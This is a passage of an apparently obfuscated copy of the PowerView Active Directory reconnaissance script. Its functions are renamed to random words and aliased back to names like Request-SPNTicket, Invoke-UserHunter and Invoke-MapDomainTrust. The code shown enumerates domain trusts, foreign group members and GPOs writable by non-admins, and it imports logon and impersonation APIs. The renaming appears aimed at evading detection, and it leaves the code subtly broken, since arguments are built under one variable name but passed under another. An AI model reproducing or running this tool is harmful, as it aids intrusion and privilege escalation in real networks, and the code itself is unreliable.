        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            if ($PSBoundParameters['Server']) {
                $RyIVEAFp99 = $YdBDxrjg99
            }
            elseif ($jeGdZvYa99 -and $jeGdZvYa99.Trim() -ne '') {
                $RyIVEAFp99 = $jeGdZvYa99
            }
            else {
                $RyIVEAFp99 = $Null
            }
            $dPkmWUmh99 = [IntPtr]::Zero
            $Flags = 63
            $GHfSTjsH99 = 0
            $sBoEOClb99 = $fJiOXvXs99::DsEnumerateDomainTrusts($RyIVEAFp99, $Flags, [ref]$dPkmWUmh99, [ref]$GHfSTjsH99)
            $FXdWquQC99 = $dPkmWUmh99.ToInt64()
            if (($sBoEOClb99 -eq 0) -and ($FXdWquQC99 -gt 0)) {
                $yZQvREQI99 = $IQmmhujF99::GetSize()
                for ($i = 0; ($i -lt $GHfSTjsH99); $i++) {
                    $Jmdkrssj99 = New-Object System.Intptr -ArgumentList $FXdWquQC99
                    $Info = $Jmdkrssj99 -as $IQmmhujF99
                    $FXdWquQC99 = $Jmdkrssj99.ToInt64()
                    $FXdWquQC99 += $yZQvREQI99
                    $dksPFgte99 = ''
                    $sBoEOClb99 = $iVwkknTh99::ConvertSidToStringSid($Info.DomainSid, [ref]$dksPFgte99);$KcubREEf99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if ($sBoEOClb99 -eq 0) {
                        Write-Verbose "[foyer] Error: $(([ComponentModel.Win32Exception] $KcubREEf99).Message)"
                    }
                    else {
                        $sQzJlGxz99 = New-Object PSObject
                        $sQzJlGxz99 | Add-Member Noteproperty 'SourceName' $eWwnPtdS99
                        $sQzJlGxz99 | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $sQzJlGxz99 | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $sQzJlGxz99 | Add-Member Noteproperty 'Flags' $Info.Flags
                        $sQzJlGxz99 | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $sQzJlGxz99 | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $sQzJlGxz99 | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $sQzJlGxz99 | Add-Member Noteproperty 'TargetSid' $dksPFgte99
                        $sQzJlGxz99 | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $sQzJlGxz99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $sQzJlGxz99
                    }
                }
                $Null = $fJiOXvXs99::NetApiBufferFree($dPkmWUmh99)
            }
            else {
                Write-Verbose "[foyer] Error: $(([ComponentModel.Win32Exception] $sBoEOClb99).Message)"
            }
        }
        else {
            $eJmvWtGL99 = Herodotus @NetSearcherArguments
            if ($eJmvWtGL99) {
                $eJmvWtGL99.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}
function Maoists {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $EpmHvRmP99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $ApBgtbYF99 = @{}
        if ($PSBoundParameters['Forest']) { $ApBgtbYF99['Forest'] = $EpmHvRmP99 }
        if ($PSBoundParameters['Credential']) { $ApBgtbYF99['Credential'] = $DOZPHpup99 }
        $UYJLvIdE99 = syllabified @NetForestArguments
        if ($UYJLvIdE99) {
            $UYJLvIdE99.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}
function Protestantisms {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $ZvvIEIXc99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $zLdPCUTB99 = @{}
        $zLdPCUTB99['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Properties']) { $zLdPCUTB99['Properties'] = $PvRupVWt99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['SecurityMasks']) { $zLdPCUTB99['SecurityMasks'] = $ZvvIEIXc99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        if ($PSBoundParameters['Raw']) { $zLdPCUTB99['Raw'] = $Raw }
    }
    PROCESS {
        togae @SearcherArguments  | ForEach-Object {
            ForEach ($cnpuFIVf99 in $_.memberof) {
                $Index = $cnpuFIVf99.IndexOf('DC=')
                if ($Index) {
                    $OSOvmOhH99 = $($cnpuFIVf99.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $iklzXVbi99 = $_.distinguishedname
                    $MCRkzebg99 = $iklzXVbi99.IndexOf('DC=')
                    $BUwbCXsa99 = $($_.distinguishedname.SubString($MCRkzebg99)) -replace 'DC=','' -replace ',','.'
                    if ($OSOvmOhH99 -ne $BUwbCXsa99) {
                        $sWPGjowW99 = $cnpuFIVf99.Split(',')[0].split('=')[1]
                        $cYQnIFiw99 = New-Object PSObject
                        $cYQnIFiw99 | Add-Member Noteproperty 'UserDomain' $BUwbCXsa99
                        $cYQnIFiw99 | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $cYQnIFiw99 | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $cYQnIFiw99 | Add-Member Noteproperty 'GroupDomain' $OSOvmOhH99
                        $cYQnIFiw99 | Add-Member Noteproperty 'GroupName' $sWPGjowW99
                        $cYQnIFiw99 | Add-Member Noteproperty 'GroupDistinguishedName' $cnpuFIVf99
                        $cYQnIFiw99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $cYQnIFiw99
                    }
                }
            }
        }
    }
}
function Leanne {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $ZvvIEIXc99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $zLdPCUTB99 = @{}
        $zLdPCUTB99['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Properties']) { $zLdPCUTB99['Properties'] = $PvRupVWt99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['SecurityMasks']) { $zLdPCUTB99['SecurityMasks'] = $ZvvIEIXc99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        if ($PSBoundParameters['Raw']) { $zLdPCUTB99['Raw'] = $Raw }
    }
    PROCESS {
        $qoqxbAgA99 = @('Users', 'Domain Users', 'Guests')
        deform @SearcherArguments | Where-Object { $qoqxbAgA99 -notcontains $_.samaccountname } | ForEach-Object {
            $sWPGjowW99 = $_.samAccountName
            $rEecdrny99 = $_.distinguishedname
            $OSOvmOhH99 = $rEecdrny99.SubString($rEecdrny99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
            $_.member | ForEach-Object {
                $YKMrlVYS99 = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($OSOvmOhH99 -ne $YKMrlVYS99)) {
                    $MwijdYWz99 = $_
                    $EhoMnepi99 = $_.Split(',')[0].split('=')[1]
                    $BdNCepTn99 = New-Object PSObject
                    $BdNCepTn99 | Add-Member Noteproperty 'GroupDomain' $OSOvmOhH99
                    $BdNCepTn99 | Add-Member Noteproperty 'GroupName' $sWPGjowW99
                    $BdNCepTn99 | Add-Member Noteproperty 'GroupDistinguishedName' $rEecdrny99
                    $BdNCepTn99 | Add-Member Noteproperty 'MemberDomain' $YKMrlVYS99
                    $BdNCepTn99 | Add-Member Noteproperty 'MemberName' $EhoMnepi99
                    $BdNCepTn99 | Add-Member Noteproperty 'MemberDistinguishedName' $MwijdYWz99
                    $BdNCepTn99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $BdNCepTn99
                }
            }
        }
    }
}
function flannels {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $CnaAXLuN99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    $aVzwDluq99 = @{}
    $rwJVXMOV99 = New-Object System.Collections.Stack
    $dSyfYZcq99 = @{}
    if ($PSBoundParameters['API']) { $dSyfYZcq99['API'] = $API }
    if ($PSBoundParameters['NET']) { $dSyfYZcq99['NET'] = $NET }
    if ($PSBoundParameters['LDAPFilter']) { $dSyfYZcq99['LDAPFilter'] = $gzpPmKdI99 }
    if ($PSBoundParameters['Properties']) { $dSyfYZcq99['Properties'] = $PvRupVWt99 }
    if ($PSBoundParameters['SearchBase']) { $dSyfYZcq99['SearchBase'] = $MBPsLBEN99 }
    if ($PSBoundParameters['Server']) { $dSyfYZcq99['Server'] = $YdBDxrjg99 }
    if ($PSBoundParameters['SearchScope']) { $dSyfYZcq99['SearchScope'] = $eLpWCwqM99 }
    if ($PSBoundParameters['ResultPageSize']) { $dSyfYZcq99['ResultPageSize'] = $xRYvUWYi99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $dSyfYZcq99['ServerTimeLimit'] = $vqNdfRPs99 }
    if ($PSBoundParameters['Tombstone']) { $dSyfYZcq99['Tombstone'] = $CnaAXLuN99 }
    if ($PSBoundParameters['Credential']) { $dSyfYZcq99['Credential'] = $DOZPHpup99 }
    if ($PSBoundParameters['Credential']) {
        $sElsZosi99 = (Herodotus -DOZPHpup99 $DOZPHpup99).Name
    }
    else {
        $sElsZosi99 = (Herodotus).Name
    }
    $rwJVXMOV99.Push($sElsZosi99)
    while($rwJVXMOV99.Count -ne 0) {
        $jeGdZvYa99 = $rwJVXMOV99.Pop()
        if ($jeGdZvYa99 -and ($jeGdZvYa99.Trim() -ne '') -and (-not $aVzwDluq99.ContainsKey($jeGdZvYa99))) {
            Write-Verbose "[flannels] Enumerating trusts for domain: '$jeGdZvYa99'"
            $Null = $aVzwDluq99.Add($jeGdZvYa99, '')
            try {
                $dSyfYZcq99['Domain'] = $jeGdZvYa99
                $IVJIhXUd99 = foyer @DomainTrustArguments
                if ($IVJIhXUd99 -isnot [System.Array]) {
                    $IVJIhXUd99 = @($IVJIhXUd99)
                }
                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $DaVBBfFb99 = @{}
                    if ($PSBoundParameters['Forest']) { $DaVBBfFb99['Forest'] = $EpmHvRmP99 }
                    if ($PSBoundParameters['Credential']) { $DaVBBfFb99['Credential'] = $DOZPHpup99 }
                    $IVJIhXUd99 += Maoists @ForestTrustArguments
                }
                if ($IVJIhXUd99) {
                    if ($IVJIhXUd99 -isnot [System.Array]) {
                        $IVJIhXUd99 = @($IVJIhXUd99)
                    }
                    ForEach ($Trust in $IVJIhXUd99) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            $Null = $rwJVXMOV99.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[flannels] Error: $_"
            }
        }
    }
}
function glycogen {
    [CmdletBinding()]
    Param (
        [String]
        $eItNVieP99 = '*',
        [ValidateRange(1,10000)] 
        [Int]
        $apcLeWdd99 = 200
    )
    $kTWCRPPk99 = @('SYSTEM','Domain Admins','Enterprise Admins')
    $EpmHvRmP99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $EbXARlUD99 = @($EpmHvRmP99.Domains)
    $rwJVXMOV99 = $EbXARlUD99 | foreach { $_.GetDirectoryEntry() }
    foreach ($jeGdZvYa99 in $rwJVXMOV99) {
        $nQZyhrEp99 = "(&(objectCategory=groupPolicyContainer)(displayname=$eItNVieP99))"
        $sPshdNSJ99 = New-Object System.DirectoryServices.DirectorySearcher
        $sPshdNSJ99.SearchRoot = $jeGdZvYa99
        $sPshdNSJ99.Filter = $nQZyhrEp99
        $sPshdNSJ99.PageSize = $apcLeWdd99
        $sPshdNSJ99.SearchScope = "Subtree"
        $LcaFLwaz99 = $sPshdNSJ99.FindAll()
        foreach ($gpo in $LcaFLwaz99){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $kTWCRPPk99 -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($ACL -ne $null){
            $aUNOOABe99 = New-Object psobject
            $aUNOOABe99 | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
            $aUNOOABe99 | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $aUNOOABe99 | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $aUNOOABe99 | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $aUNOOABe99
        }
        }
    }
}
$Mod = orthographies -ModuleName Win32
$NuEUignM99 = umbilicus $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}
$eFqgcJVd99 = umbilicus $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield
$tGlaulwz99 = umbilicus $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield
$tFgYEDdD99 = umbilicus $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
$OiYydDav99 = twiddled $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $tFgYEDdD99
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}
$vpNiFEyv99 = twiddled $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}
$hJcMUUQG99 = twiddled $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}
$BFaMvVzx99 = twiddled $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}
$nnGuwnqw99 = twiddled $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}
$slEdBJvw99 = umbilicus $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}
$jxOErltE99 = twiddled $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}
$ThxMHIak99 = twiddled $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $slEdBJvw99
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}
$DsDomainFlag = umbilicus $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$DoIZOdXB99 = umbilicus $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$RZWESSPE99 = umbilicus $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}
$IQmmhujF99 = twiddled $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $DoIZOdXB99
    TrustAttributes = field 5 $RZWESSPE99
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}
$DznfDdmZ99 = twiddled $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($DznfDdmZ99, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)
$Types = $FunctionDefinitions | Maude -Module $Mod -Namespace 'Win32'
$fJiOXvXs99 = $Types['netapi32']
$iVwkknTh99 = $Types['advapi32']
$CrMxeVWd99 = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']
Set-Alias Get-IPAddress glares
Set-Alias Convert-NameToSid Ptolemy
Set-Alias Convert-SidToName bandaging
Set-Alias Request-SPNTicket easiness
Set-Alias Get-DNSZone contrariness
Set-Alias Get-DNSRecord piebald
Set-Alias Get-NetDomain Herodotus
Set-Alias Get-NetDomainController shriller
Set-Alias Get-NetForest syllabified
Set-Alias Get-NetForestDomain extinguish
Set-Alias Get-NetForestCatalog rebating
Set-Alias Get-NetUser togae
Set-Alias Get-UserEvent trisect
Set-Alias Get-NetComputer boozed
Set-Alias Get-ADObject cupped
Set-Alias Set-ADObject airway
Set-Alias Get-ObjectAcl annihilated
Set-Alias Add-ObjectAcl skydive
Set-Alias Invoke-ACLScanner Gruyeres
Set-Alias Get-GUIDMap obsessively
Set-Alias Get-NetOU disproved
Set-Alias Get-NetSite bandannas
Set-Alias Get-NetSubnet rich
Set-Alias Get-NetGroup deform
Set-Alias Find-ManagedSecurityGroups neared
Set-Alias Get-NetGroupMember expostulation
Set-Alias Get-NetFileServer Augustan
Set-Alias Get-DFSshare suctioned
Set-Alias Get-NetGPO dishonesty
Set-Alias Get-NetGPOGroup Remington
Set-Alias Find-GPOLocation matchsticks
Set-Alias Find-GPOComputerAdmin litterbugs
Set-Alias Get-LoggedOnLocal Nash
Set-Alias Invoke-CheckLocalAdminAccess illegitimate
Set-Alias Get-SiteName censoring
Set-Alias Get-Proxy trillions
Set-Alias Get-LastLoggedOn dropsy
Set-Alias Get-CachedRDPConnection flopping
Set-Alias Get-RegistryMountedDrive womanize
Set-Alias Get-NetProcess amiss
Set-Alias Invoke-ThreadedFunction prohibits
Set-Alias Invoke-UserHunter telexed
Set-Alias Invoke-ProcessHunter subsections
Set-Alias Invoke-EventHunter floras
Set-Alias Invoke-ShareFinder Reinhold
Set-Alias Invoke-FileFinder accents
Set-Alias Invoke-EnumerateLocalAdmin bobbling
Set-Alias Get-NetDomainTrust foyer
Set-Alias Get-NetForestTrust Maoists
Set-Alias Find-ForeignUser Protestantisms
Set-Alias Find-ForeignGroup Leanne
Set-Alias Invoke-MapDomainTrust flannels
Set-Alias Get-DomainPolicy swankest
